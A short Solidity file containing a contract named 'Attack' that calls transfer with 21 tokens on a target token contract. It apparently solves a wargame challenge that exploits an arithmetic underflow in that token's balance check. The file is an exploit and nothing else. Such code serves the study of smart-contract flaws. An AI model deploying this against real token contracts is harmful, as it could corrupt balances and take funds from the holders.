// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

interface IToken {
  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address _owner) external returns(uint);
}

contract Attack {
  IToken public target;

  constructor(address _target) public{
    target = IToken(_target);
  }

  function attack(address _to) public {
    target.transfer(_to, 21 );
  }

  function getBalance(address _user) internal returns(uint) {
    return target.balanceOf(_user);
  }
}